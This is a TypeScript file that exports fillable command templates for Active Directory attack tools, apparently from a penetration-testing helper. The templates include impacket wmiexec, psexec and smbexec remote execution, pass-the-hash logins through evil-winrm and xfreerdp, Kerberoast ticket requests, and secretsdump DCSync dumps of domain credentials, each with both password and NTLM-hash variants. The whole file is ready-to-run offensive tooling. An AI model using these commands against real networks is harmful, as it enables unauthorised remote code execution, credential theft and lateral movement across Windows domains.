interface Command {
  template: string;
  authType: "password" | "ntlmHash";
}

const domainCommands: Command[] = [
  {
    template:
      "impacket-wmiexec '{domain}'/'{username}':'{password}'@'{targetHost}'",
    authType: "password",
  },
  {
    template:
      "impacket-psexec '{domain}'/'{username}':'{password}'@'{targetHost}'",
    authType: "password",
  },
  {
    template:
      "impacket-smbexec '{domain}'/'{username}':'{password}'@'{targetHost}'",
    authType: "password",
  },
  {
    template:
      "impacket-smbclient '{domain}'/'{username}':'{password}'@'{targetHost}'",
    authType: "password",
  },
  {
    template:
      "impacket-mssqlclient '{domain}'/'{username}':'{password}'@'{targetHost}'",
    authType: "password",
  },
  {
    template:
      "xfreerdp /u:'{username}' /d:'{domain}' /p:'{password}' /v:'{targetHost}' /cert-ignore /dynamic-resolution",
    authType: "password",
  },
  {
    template: "evil-winrm -u '{username}' -p '{password}' -i '{targetHost}'",
    authType: "password",
  },
  {
    template:
      "impacket-GetUserSPNs -request -dc-ip '{targetHost}' '{domain}'/'{username}':'{password}' -outputfile hashes.kerberoast",
    authType: "password",
  },
  {
    template:
      "impacket-secretsdump -outputfile 'dcsync.dump' '{domain}'/'{username}':'{password}'@'{targetHost}'",
    authType: "password",
  },
  {
    template:
      "rpcclient -U '{domain}/{username}' --password '{password}' '{targetHost}'",
    authType: "password",
  },
  {
    template:
      "impacket-wmiexec '{domain}'/'{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "impacket-psexec '{domain}'/'{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "impacket-smbexec '{domain}'/'{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "impacket-smbclient '{domain}'/'{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "impacket-mssqlclient '{domain}'/'{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "xfreerdp /u:'{username}' /d:'{domain}' /pth:'{ntlmHash}' /v:'{targetHost}' /cert-ignore /dynamic-resolution",
    authType: "ntlmHash",
  },
  {
    template: "evil-winrm -u '{username}' -H '{ntlmHash}' -i '{targetHost}'",
    authType: "ntlmHash",
  },
  {
    template:
      "impacket-GetUserSPNs -request -dc-ip '{targetHost}' '{domain}'/'{username}' -hashes '00:{ntlmHash}' -outputfile hashes.kerberoast",
    authType: "ntlmHash",
  },
  {
    template:
      "impacket-secretsdump -outputfile 'dcsync.dump' '{domain}'/'{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "rpcclient -U '{domain}/{username}' --pw-nt-hash '{ntlmHash}' '{targetHost}'",
    authType: "ntlmHash",
  },
];

export default domainCommands;
